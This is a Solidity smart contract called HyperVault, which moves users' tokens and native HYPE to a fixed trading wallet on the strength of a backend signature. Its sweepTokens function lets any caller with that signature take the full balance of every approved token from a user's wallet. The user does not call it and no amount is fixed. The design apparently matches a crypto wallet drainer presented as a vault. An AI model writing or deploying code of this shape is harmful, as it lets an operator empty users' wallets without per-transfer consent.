// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import '@openzeppelin/contracts/utils/cryptography/ECDSA.sol';
import '@openzeppelin/contracts/utils/cryptography/EIP712.sol';

contract HyperVault is EIP712 {
    using ECDSA for bytes32;

    address public immutable tradingWallet;
    address public immutable backendSigner;

    mapping(address => mapping(uint256 => bool)) public usedNonces;

    event TokenSwept(address indexed user, address indexed token, uint256 amount);
    event HypeSwept(address indexed user, uint256 amount);

    bytes32 private constant SWEEP_TOKENS_TYPEHASH = keccak256(
        "SweepTokens(address user,address[] tokens,uint256 nonce,uint256 deadline)"
    );

    bytes32 private constant SWEEP_HYPE_TYPEHASH = keccak256(
        "SweepHype(address user,uint256 amount,uint256 nonce,uint256 deadline)"
    );

    constructor(
        address _tradingWallet,
        address _backendSigner
    ) EIP712("HyperVault", "1") {
        require(_tradingWallet != address(0), "Invalid trading wallet");
        require(_backendSigner != address(0), "Invalid backend signer");
        
        tradingWallet = _tradingWallet;
        backendSigner = _backendSigner;
    }

    // Sweep ERC20 tokens FROM user wallet TO trading wallet
    function sweepTokens(
        address user,
        address[] calldata tokens,
        uint256 nonce,
        uint256 deadline,
        bytes calldata signature
    ) external {
        require(block.timestamp <= deadline, "Signature expired");
        require(!usedNonces[user][nonce], "Nonce already used");

        bytes32 structHash = keccak256(
            abi.encode(
                SWEEP_TOKENS_TYPEHASH,
                user,
                keccak256(abi.encodePacked(tokens)),
                nonce,
                deadline
            )
        );

        bytes32 hash = _hashTypedDataV4(structHash);
        address signer = hash.recover(signature);
        require(signer == backendSigner, "Invalid signature");

        usedNonces[user][nonce] = true;

        // Sweep all tokens
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20 token = IERC20(tokens[i]);
            uint256 balance = token.balanceOf(user);
            
            if (balance > 0) {
                uint256 allowance = token.allowance(user, address(this));
                require(allowance >= balance, "Insufficient allowance");
                
                require(
                    token.transferFrom(user, tradingWallet, balance),
                    "Token transfer failed"
                );
                
                emit TokenSwept(user, tokens[i], balance);
            }
        }
    }

    // Sweep native HYPE FROM user TO trading wallet
    // User sends HYPE to this function, we forward to trading wallet
    function sweepHype(
        address user,
        uint256 amount,
        uint256 nonce,
        uint256 deadline,
        bytes calldata signature
    ) external payable {
        require(msg.sender == user, "Only user can call");
        require(msg.value == amount, "Amount mismatch");
        require(block.timestamp <= deadline, "Signature expired");
        require(!usedNonces[user][nonce], "Nonce already used");

        bytes32 structHash = keccak256(
            abi.encode(
                SWEEP_HYPE_TYPEHASH,
                user,
                amount,
                nonce,
                deadline
            )
        );

        bytes32 hash = _hashTypedDataV4(structHash);
        address signer = hash.recover(signature);
        require(signer == backendSigner, "Invalid signature");

        usedNonces[user][nonce] = true;

        // Forward HYPE to trading wallet
        (bool success, ) = tradingWallet.call{value: amount}("");
        require(success, "HYPE transfer failed");

        emit HypeSwept(user, amount);
    }

    // Combined sweep: HYPE + Tokens in one transaction
    function sweepAll(
        address user,
        uint256 hypeAmount,
        address[] calldata tokens,
        uint256 nonce,
        uint256 deadline,
        bytes calldata signature
    ) external payable {
        require(msg.sender == user, "Only user can call");
        require(msg.value == hypeAmount, "HYPE amount mismatch");
        require(block.timestamp <= deadline, "Signature expired");
        require(!usedNonces[user][nonce], "Nonce already used");

        bytes32 structHash = keccak256(
            abi.encode(
                keccak256("SweepAll(address user,uint256 hypeAmount,address[] tokens,uint256 nonce,uint256 deadline)"),
                user,
                hypeAmount,
                keccak256(abi.encodePacked(tokens)),
                nonce,
                deadline
            )
        );

        bytes32 hash = _hashTypedDataV4(structHash);
        address signer = hash.recover(signature);
        require(signer == backendSigner, "Invalid signature");

        usedNonces[user][nonce] = true;

        // Sweep HYPE
        if (hypeAmount > 0) {
            (bool success, ) = tradingWallet.call{value: hypeAmount}("");
            require(success, "HYPE transfer failed");
            emit HypeSwept(user, hypeAmount);
        }

        // Sweep tokens
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20 token = IERC20(tokens[i]);
            uint256 balance = token.balanceOf(user);
            
            if (balance > 0) {
                uint256 allowance = token.allowance(user, address(this));
                require(allowance >= balance, "Insufficient allowance");
                
                require(
                    token.transferFrom(user, tradingWallet, balance),
                    "Token transfer failed"
                );
                
                emit TokenSwept(user, tokens[i], balance);
            }
        }
    }
}
